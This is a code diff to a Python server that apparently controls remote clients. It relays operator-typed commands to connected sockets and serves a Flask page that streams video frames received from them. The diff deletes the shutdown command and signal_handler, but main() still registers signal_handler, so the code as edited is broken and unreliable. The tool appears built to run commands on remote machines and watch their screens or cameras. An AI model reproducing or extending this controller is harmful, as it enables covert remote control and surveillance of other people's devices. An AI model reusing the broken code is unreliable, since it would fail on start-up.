@@ -8,13 +8,14 @@ import cv2
 import numpy as np
 import sys
 import os
-import requests
 
 init(autoreset=True)
 
 app = Flask(__name__)
 clients = {}
 server_thread = None
+
+
 
 def start_streaming(client_socket, mode):
     print(Fore.BLUE + "[ * ] Starting...")
@@ -29,10 +30,9 @@ def start_streaming(client_socket, mode):
 
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
-    
+
     # Run the Flask app in a separate thread to handle the streaming
-    server_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False))
-    server_thread.start()
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
 
 def generate_frames(client_socket):
     while True:
@@ -114,22 +114,8 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + output)
             continue
 
-        if command == "/k":
-            shutdown_flask_server()
-            continue
-
         client_socket.send(command.encode('utf-8'))
 
-def shutdown_flask_server():
-    print(Fore.RED + "[ * ] Shutting down Flask server...")
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        raise RuntimeError('Not running with the Werkzeug Server')
-    func()
-
-def signal_handler(sig, frame):
-    print(Fore.RED + "\n[ * ] Shutting down server...")
-    sys.exit(0)
 
 def main():
     signal.signal(signal.SIGINT, signal_handler)
